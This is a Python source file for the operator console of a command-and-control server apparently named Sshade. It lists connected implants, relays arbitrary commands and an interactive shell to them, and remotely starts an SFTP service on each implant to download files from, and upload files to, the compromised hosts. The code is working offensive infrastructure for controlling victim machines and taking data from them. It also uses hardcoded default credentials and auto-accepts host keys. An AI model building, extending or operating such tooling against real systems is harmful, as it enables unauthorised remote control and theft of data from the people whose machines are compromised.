import logging
import os
import threading
import sys
import shlex
from typing import Dict, Optional, List, Any
import json
import time
import signal
import readline
import paramiko
from pathlib import Path
from .banner import SshadeBannerAdvanced
from ..session.client_session import ClientSession

logger = logging.getLogger('c2.cli')

class SFTPClient:
    """SFTP client for file operations with implants via port forwarding"""
    
    def __init__(self, client_id: str, port: int = 3333, username: str = "user", password: str = "password"):
        self.client_id = client_id
        self.hostname = "localhost"  # Always localhost due to port forwarding
        self.port = port
        self.username = username
        self.password = password
        self.ssh_client = None
        self.sftp_client = None
        self.connected = False
        self.current_path = "/"
        
    def connect(self) -> bool:
        """Connect to SFTP server via port forwarding"""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to localhost on forwarded port
            self.ssh_client.connect(
                hostname=self.hostname,
                port=self.port,
                username=self.username,
                password=self.password,
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            
            self.sftp_client = self.ssh_client.open_sftp()
            self.connected = True
            logger.info(f"SFTP connected to {self.hostname}:{self.port} (forwarded)")
            return True
            
        except Exception as e:
            logger.error(f"SFTP connection failed: {e}")
            self.disconnect()
            return False
    
    def disconnect(self):
        """Disconnect from SFTP server"""
        try:
            if self.sftp_client:
                self.sftp_client.close()
            if self.ssh_client:
                self.ssh_client.close()
        except Exception as e:
            logger.error(f"Error disconnecting SFTP: {e}")
        finally:
            self.sftp_client = None
            self.ssh_client = None
            self.connected = False
    
    def list_directory(self, path: str = None) -> List[Dict]:
        """List directory contents"""
        if not self.connected:
            raise Exception("Not connected to SFTP server")
            
        target_path = path if path else self.current_path
        
        try:
            items = []
            for item in self.sftp_client.listdir_attr(target_path):
                item_info = {
                    'name': item.filename,
                    'size': item.st_size if item.st_size else 0,
                    'is_dir': self._is_directory(item.st_mode) if item.st_mode else False,
                    'modified': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(item.st_mtime)) if item.st_mtime else 'Unknown'
                }
                items.append(item_info)
            return items
        except Exception as e:
            raise Exception(f"Failed to list directory {target_path}: {e}")
    
    def change_directory(self, path: str) -> bool:
        """Change current directory"""
        if not self.connected:
            raise Exception("Not connected to SFTP server")
            
        try:
            # Handle relative paths
            if path == "..":
                new_path = "/".join(self.current_path.rstrip("/").split("/")[:-1]) or "/"
            elif path.startswith("/"):
                new_path = path
            else:
                new_path = f"{self.current_path.rstrip('/')}/{path}"
            
            # Normalize path
            new_path = new_path.replace("//", "/")
            
            # Test if directory exists by trying to list it
            self.sftp_client.listdir(new_path)
            self.current_path = new_path
            return True
            
        except Exception as e:
            raise Exception(f"Failed to change directory to {path}: {e}")
    
    def download_file(self, remote_path: str, local_path: str) -> bool:
        """Download file from remote to local"""
        if not self.connected:
            raise Exception("Not connected to SFTP server")
            
        try:
            # Create local directory if it doesn't exist
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            # Handle relative paths
            if not remote_path.startswith("/"):
                remote_path = f"{self.current_path.rstrip('/')}/{remote_path}"
            
            self.sftp_client.get(remote_path, local_path)
            logger.info(f"Downloaded {remote_path} to {local_path}")
            return True
            
        except Exception as e:
            raise Exception(f"Failed to download {remote_path}: {e}")
    
    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """Upload file from local to remote"""
        if not self.connected:
            raise Exception("Not connected to SFTP server")
            
        if not os.path.exists(local_path):
            raise Exception(f"Local file does not exist: {local_path}")
            
        try:
            # Handle relative paths
            if not remote_path.startswith("/"):
                remote_path = f"{self.current_path.rstrip('/')}/{remote_path}"
                
            self.sftp_client.put(local_path, remote_path)
            logger.info(f"Uploaded {local_path} to {remote_path}")
            return True
            
        except Exception as e:
            raise Exception(f"Failed to upload {local_path}: {e}")
    
    def get_current_path(self) -> str:
        """Get current remote path"""
        return self.current_path
    
    def _is_directory(self, mode: int) -> bool:
        """Check if file mode indicates directory"""
        import stat
        return stat.S_ISDIR(mode)


class CommandHandler:
    """CLI interface for C2 server with SFTP support"""
    
    def __init__(self, config: dict):
        self.config = config
        self.clients: Dict[str, ClientSession] = {}
        self.sftp_clients: Dict[str, SFTPClient] = {}
        self.sftp_ports: Dict[str, int] = {}  # Track SFTP ports per client
        self.current_client_id = None
        self.running = False
        self.in_shell = False
        self.in_sftp = False
        self.original_sigint = None
        
        # Create downloads directory
        self.downloads_dir = Path("data/downloads")
        self.downloads_dir.mkdir(parents=True, exist_ok=True)

    def start(self):
        """Start the command interface"""
        # Store original signal handler
        self.original_sigint = signal.getsignal(signal.SIGINT)
        
        # Set up main console signal handler
        signal.signal(signal.SIGINT, self._handle_sigint)
        
        self.running = True
        logger.info("Command interface started")
        
        SshadeBannerAdvanced.display()
        print("\nC2 Server Command Interface")
        print("Type 'help' for available commands")
        
        while self.running:
            try:
                cmd_line = input(self._get_prompt())
                if not cmd_line.strip():
                    continue
                    
                self._process_command(cmd_line)
                    
            except KeyboardInterrupt:
                print()  # New line after ^C
                continue
            except EOFError:
                print("\nExiting command interface")
                self.running = False
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                print(f"Error: {str(e)}")
        
        # Cleanup SFTP connections and stop services
        self._cleanup_sftp_connections()
        
        # Restore original signal handler when exiting
        signal.signal(signal.SIGINT, self.original_sigint)
    
    def _handle_sigint(self, signum, frame):
        """Handle SIGINT (Ctrl+C) differently based on context"""
        if self.in_shell:
            # Forward Ctrl+C to the shell session
            if self.current_client_id and self.current_client_id in self.clients:
                client = self.clients[self.current_client_id]
                client.handle_signal(signal.SIGINT)
        elif self.in_sftp:
            # In SFTP mode, return to main console and stop SFTP service
            print("\nExiting SFTP mode")
            self._exit_sftp_mode()
        else:
            # In main console, just print a newline and continue
            print("\nUse 'quit' to exit")
    
    def stop(self):
        """Stop the command interface"""
        self.running = False
        self._cleanup_sftp_connections()
        
        # Restore original signal handler
        if self.original_sigint:
            signal.signal(signal.SIGINT, self.original_sigint)
    
    def _cleanup_sftp_connections(self):
        """Clean up all SFTP connections and stop services"""
        for client_id, sftp_client in self.sftp_clients.items():
            sftp_client.disconnect()
            # Stop SFTP service on implant
            self._stop_sftp_service(client_id)
        self.sftp_clients.clear()
        self.sftp_ports.clear()
        
    def register_client(self, client: ClientSession):
        """Register a new client"""
        self.clients[client.id] = client
        
        # If this is the first client, make it the current one
        if not self.current_client_id:
            self.current_client_id = client.id
            
        # Notify about new client
        print(f"\nNew client connected: {client}")
        print(f"{self._get_prompt()}", end="", flush=True)

    def _disconnect_client(self, client_selector: str):
        """Disconnect a client and remove it from the list"""
        # Try to interpret as index first
        try:
            idx = int(client_selector)
            if idx < 0 or idx >= len(self.clients):
                print(f"Invalid client index: {idx}")
                return
            client_id = list(self.clients.keys())[idx]
        except ValueError:
            # If not a number, use as client ID
            client_id = client_selector

        if client_id not in self.clients:
            print(f"Client not found: {client_selector}")
            return

        client = self.clients[client_id]
        
        # Stop SFTP service and disconnect SFTP if connected
        if client_id in self.sftp_clients:
            self.sftp_clients[client_id].disconnect()
            self._stop_sftp_service(client_id)
            del self.sftp_clients[client_id]
            if client_id in self.sftp_ports:
                del self.sftp_ports[client_id]
            
        if client.disconnect():
            self._remove_client(client_id)
            print(f"Client {client_id} disconnected and removed")
        else:
            print(f"Error disconnecting client {client_id}")
    
    def _get_prompt(self):
        """Get the command prompt string"""
        if self.in_sftp and self.current_client_id:
            client = self.clients[self.current_client_id]
            sftp_client = self.sftp_clients.get(self.current_client_id)
            current_path = sftp_client.get_current_path() if sftp_client else "/"
            return f"sftp({client.hostname}:{current_path})> "
        elif self.current_client_id and self.current_client_id in self.clients:
            client = self.clients[self.current_client_id]
            return f"c2({client.hostname})> "
        return "c2> "
    
    def _process_command(self, cmd_line: str):
        """Process a command line input"""
        # Split the command with proper handling of quotes
        try:
            args = shlex.split(cmd_line)
        except Exception:
            args = cmd_line.split()
            
        if not args:
            return
            
        cmd = args[0].lower()
        
        # Handle SFTP mode commands
        if self.in_sftp:
            self._process_sftp_command(cmd, args)
            return
        
        # Local commands
        if cmd == "quit":
            print("Exiting command interface (server continues running)")      
            self.running = False
            
        elif cmd == "help":
            self._show_help()
            
        elif cmd == "clients":
            self._list_clients()
            
        elif cmd == "use":
            if len(args) < 2:
                print("Usage: use <client_id>")
                return
            self._switch_client(args[1])
            
        elif cmd == "info":
            self._show_client_info()
            
        elif cmd == "disconnect":
            if len(args) < 2:
                print("Usage: disconnect <client_id>")
                return
            self._disconnect_client(args[1])
            
        elif cmd == "shell":
            self._interactive_shell()
            
        elif cmd == "sftp":
            self._enter_sftp_mode()
            
        # Send command to client if not a built-in command
        else:
            response = self._send_command(cmd_line)
            if response:
                print(response)
    
    def _process_sftp_command(self, cmd: str, args: List[str]):
        """Process SFTP commands"""
        if not self.current_client_id or self.current_client_id not in self.sftp_clients:
            print("SFTP not connected")
            return
            
        sftp_client = self.sftp_clients[self.current_client_id]
        
        try:
            if cmd == "quit" or cmd == "exit":
                print("Exiting SFTP mode")
                self._exit_sftp_mode()
                
            elif cmd == "ls" or cmd == "dir":
                path = args[1] if len(args) > 1 else None
                items = sftp_client.list_directory(path)
                self._display_directory_listing(items)
                
            elif cmd == "cd":
                if len(args) < 2:
                    print("Usage: cd <directory>")
                    return
                sftp_client.change_directory(args[1])
                print(f"Changed directory to: {sftp_client.get_current_path()}")
                
            elif cmd == "pwd":
                print(sftp_client.get_current_path())
                
            elif cmd == "get" or cmd == "download":
                if len(args) < 2:
                    print("Usage: get <remote_file> [local_file]")
                    return
                remote_file = args[1]
                
                # Default local path in downloads directory
                if len(args) > 2:
                    local_file = args[2]
                else:
                    local_file = os.path.basename(remote_file)
                
                # Create client-specific download directory
                client_download_dir = self.downloads_dir / self.current_client_id
                client_download_dir.mkdir(exist_ok=True)
                local_path = client_download_dir / local_file
                
                if sftp_client.download_file(remote_file, str(local_path)):
                    print(f"Downloaded: {remote_file} -> {local_path}")
                    
            elif cmd == "put" or cmd == "upload":
                if len(args) < 2:
                    print("Usage: put <local_file> [remote_file]")
                    return
                local_file = args[1]
                
                if len(args) > 2:
                    remote_file = args[2]
                else:
                    remote_file = os.path.basename(local_file)
                    
                if sftp_client.upload_file(local_file, remote_file):
                    print(f"Uploaded: {local_file} -> {remote_file}")
                    
            elif cmd == "help":
                self._show_sftp_help()
                
            else:
                print(f"Unknown SFTP command: {cmd}")
                print("Type 'help' for available commands")
                
        except Exception as e:
            print(f"SFTP Error: {str(e)}")
    
    def _display_directory_listing(self, items: List[Dict]):
        """Display directory listing in a formatted way"""
        if not items:
            print("Directory is empty")
            return
            
        print("\nDirectory listing:")
        print("-" * 80)
        print(f"{'Type':<4} {'Name':<30} {'Size':<12} {'Modified':<20}")
        print("-" * 80)
        
        for item in sorted(items, key=lambda x: (not x['is_dir'], x['name'].lower())):
            item_type = "DIR" if item['is_dir'] else "FILE"
            size = str(item['size']) if not item['is_dir'] else "-"
            print(f"{item_type:<4} {item['name']:<30} {size:<12} {item['modified']:<20}")
        print("-" * 80)
    
    def _start_sftp_service(self, client_id: str, port: int = 3333) -> bool:
        """Start SFTP service on the implant"""
        if client_id not in self.clients:
            return False
            
        client = self.clients[client_id]
        if not client.is_active:
            return False
            
        try:
            # Send command to start SFTP service
            command = f"!sftp start {port}"
            response = client.send_command(command)
            
            if response and "started" in response.lower():
                self.sftp_ports[client_id] = port
                logger.info(f"SFTP service started on client {client_id} port {port}")
                return True
            else:
                logger.error(f"Failed to start SFTP service: {response}")
                return False
                
        except Exception as e:
            logger.error(f"Error starting SFTP service: {e}")
            return False
    
    def _stop_sftp_service(self, client_id: str) -> bool:
        """Stop SFTP service on the implant"""
        if client_id not in self.clients or client_id not in self.sftp_ports:
            return False
            
        client = self.clients[client_id]
        port = self.sftp_ports[client_id]
        
        try:
            # Send command to stop SFTP service
            command = f"!sftp stop {port}"
            response = client.send_command(command)
            
            if client_id in self.sftp_ports:
                del self.sftp_ports[client_id]
                
            logger.info(f"SFTP service stopped on client {client_id} port {port}")
            return True
            
        except Exception as e:
            logger.error(f"Error stopping SFTP service: {e}")
            return False
    
    def _enter_sftp_mode(self, port: int = 3333):
        """Enter SFTP mode with automatic service management"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        
        print(f"Starting SFTP service on {client.hostname}...")
        
        # Start SFTP service on implant
        if not self._start_sftp_service(self.current_client_id, port):
            print("Failed to start SFTP service on implant")
            return
        
        # Give the service a moment to start
        time.sleep(2)
        
        print(f"Connecting to SFTP server via port forwarding...")
        
        # Create or get existing SFTP client
        if self.current_client_id not in self.sftp_clients:
            self.sftp_clients[self.current_client_id] = SFTPClient(
                self.current_client_id, port=port
            )
        
        sftp_client = self.sftp_clients[self.current_client_id]
        
        if not sftp_client.connected:
            if not sftp_client.connect():
                print("Failed to connect to SFTP server")
                # Stop the service since we couldn't connect
                self._stop_sftp_service(self.current_client_id)
                return
        
        print(f"Connected to SFTP server. Current directory: {sftp_client.get_current_path()}")
        print("Type 'help' for SFTP commands or 'quit' to exit SFTP mode")
        self.in_sftp = True
    
    def _exit_sftp_mode(self):
        """Exit SFTP mode and stop the service"""
        if self.current_client_id and self.current_client_id in self.sftp_clients:
            # Disconnect SFTP client
            self.sftp_clients[self.current_client_id].disconnect()
            del self.sftp_clients[self.current_client_id]
            
            # Stop SFTP service on implant
            self._stop_sftp_service(self.current_client_id)
            
            print("SFTP service stopped on implant")
        
        self.in_sftp = False
    
    def _show_help(self):
        """Show help message"""
        print("\nAvailable commands:")
        print("  clients                    - List all connected clients")
        print("  use <id>                   - Switch to a specific client")
        print("  info                       - Show detailed info about current client")
        print("  shell                      - Enter interactive shell mode with current client")
        print("  sftp                       - Enter SFTP mode (automatically starts/stops service)")
        print("  disconnect <id>            - Disconnect and remove a client")
        print("  quit                       - Exit the command interface")
        print("  help                       - Show this help message")
        print("  <command>                  - Send a command to the current client")
    
    def _show_sftp_help(self):
        """Show SFTP help message"""
        print("\nSFTP Commands:")
        print("  ls [path]                  - List directory contents")
        print("  cd <directory>             - Change directory")
        print("  pwd                        - Show current directory")
        print("  get <remote_file> [local]  - Download file (saves to data/downloads/client-id/)")
        print("  put <local_file> [remote]  - Upload file")
        print("  help                       - Show this help")
        print("  quit                       - Exit SFTP mode (stops service automatically)")
    
    def _list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("No clients connected")
            return
            
        print("\nConnected clients:")
        print("-" * 80)
        print(f"{'ID':<4} {'Host':<15} {'User':<10} {'Address':<20} {'Transport':<8} {'SFTP':<6} {'Active'}")
        print("-" * 80)
        
        for i, (client_id, client) in enumerate(self.clients.items()):
            current = "*" if client_id == self.current_client_id else " "
            addr = f"{client.addr[0]}:{client.addr[1]}"
            status = "Yes" if client.is_active else "No"
            sftp_status = "Yes" if client_id in self.sftp_clients and self.sftp_clients[client_id].connected else "No"
            print(f"{current}{i:<3} {client.hostname:<15} {client.username:<10} {addr:<20} {client.transport_type:<8} {sftp_status:<6} {status}")
        print("-" * 80)
    
    def _switch_client(self, client_selector: str):
        """Switch the current client"""
        # Try to interpret as index first
        try:
            idx = int(client_selector)
            if idx < 0 or idx >= len(self.clients):
                print(f"Invalid client index: {idx}")
                return
                
            client_id = list(self.clients.keys())[idx]
            self.current_client_id = client_id
            client = self.clients[client_id]
            print(f"Switched to {client}")
            return
        except ValueError:
            pass
            
        # Try as client ID
        if client_selector in self.clients:
            self.current_client_id = client_selector
            client = self.clients[client_selector]
            print(f"Switched to {client}")
            return
            
        print(f"Client not found: {client_selector}")
    
    def _show_client_info(self):
        """Show detailed information about the current client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        info = client.to_dict()
        
        print("\nClient Information:")
        print("-" * 50)
        print(f"ID:           {info['id']}")
        print(f"Hostname:     {info['hostname']}")
        print(f"Username:     {info['username']}")
        print(f"OS:           {info['os_type']}")
        print(f"Address:      {info['addr']}")
        print(f"Transport:    {info['transport']}")
        print(f"Active:       {info['active']}")
        print(f"Connected:    {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['connect_time']))}")
        print(f"Last seen:    {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['last_seen']))}")
        print(f"Uptime:       {info['uptime']} seconds")
        
        # Show SFTP status
        sftp_connected = self.current_client_id in self.sftp_clients and self.sftp_clients[self.current_client_id].connected
        sftp_port = self.sftp_ports.get(self.current_client_id, "N/A")
        print(f"SFTP:         {'Connected' if sftp_connected else 'Disconnected'} (Port: {sftp_port})")
        
        if info['capabilities']:
            print(f"Capabilities: {', '.join(info['capabilities'])}")
        print("-" * 50)

    def _remove_client(self, client_id: str):
        """Remove a client from the list"""
        if client_id in self.clients:
            del self.clients[client_id]
            
            # Clean up SFTP connection and stop service
            if client_id in self.sftp_clients:
                self.sftp_clients[client_id].disconnect()
                del self.sftp_clients[client_id]
                self._stop_sftp_service(client_id)
            
            if client_id in self.sftp_ports:
                del self.sftp_ports[client_id]
            
            # If the removed client was the current one, reset current client
            if self.current_client_id == client_id:
                self.current_client_id = None
                print("Current client reset to None")
        else:
            print(f"Client {client_id} not found")
    
    def _send_command(self, command: str) -> Optional[str]:
        """Send a command to the current client"""
        if not self.current_client_id:
            print("No client selected")
            return None
            
        if self.current_client_id not in self.clients:
            print("Selected client no longer connected")
            return None
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return None
            
        try:
            return client.send_command(command)
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            print(f"Error: {str(e)}")
            return None
    
    def _interactive_shell(self):
        """Enter an interactive shell with the current client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return
            
        print(f"\nEntering interactive shell with {client}")
        print("Type 'quit' to return to the C2 console\n")
        
        # Set shell flag to handle signals differently
        self.in_shell = True
        
        try:
            while self.in_shell and client.is_active:
                try:
                    if not client.channel or not client.channel.active:
                        print("\nShell connection lost")
                        break
                        
                    cmd = input()
                    
                    # Handle shell exit command - only "quit" returns to console
                    if cmd.lower() == "quit":
                        print("Returning to C2 console")
                        break
                    
                    # Send command and display response
                    # Empty input is sent as a newline
                    response = client.send_command(cmd)
                    if response:
                        print(response, end='', flush=True)
                        
                except KeyboardInterrupt:
                    # KeyboardInterrupt is handled by signal handler
                    # which forwards Ctrl+C to the client
                    continue
                except EOFError:
                    print("\nExiting shell")
                    break
                except Exception as e:
                    logger.error(f"Shell error: {e}")
                    print(f"Error: {str(e)}")
                    break
        finally:
            # Reset shell flag when exiting
            self.in_shell = False
            print(f"\n{self._get_prompt()}", end="", flush=True)